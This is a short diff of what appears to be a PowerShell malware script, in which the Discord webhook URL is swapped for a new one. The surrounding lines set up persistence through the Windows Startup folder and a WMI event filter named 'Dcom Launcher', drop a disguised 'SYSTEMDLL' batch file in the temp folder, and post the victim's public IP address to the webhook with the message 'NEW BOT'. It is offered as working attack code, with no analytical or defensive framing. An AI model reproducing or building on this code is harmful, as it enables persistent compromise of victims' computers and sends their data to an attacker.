@@ -3,7 +3,7 @@ $userprof = $env:USERPROFILE;
 $startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
 $EventFilterName = 'Dcom Launcher';
 $load = "$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat";
-$uri = "https://discord.com/api/webhooks/976781418904571944/rFcutKycHneUwyQpb5iE9FXL1ACW8iWROZ4VGFKZB848PBPXOcy7r1Jc9C4HJyi0kvzH";
+$uri = "https://discord.com/api/webhooks/978199712849096724/LPK8YOUkAfGUQYpSYjBgN3wyBDUMJ3JrOkvLgqnyRASthp-2KYB1CqGaAT2YQwzECvif";
 
 $ip = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
 $hash = @{ "content" = "NEW BOT    >>-------**$ip**-------<<"; }
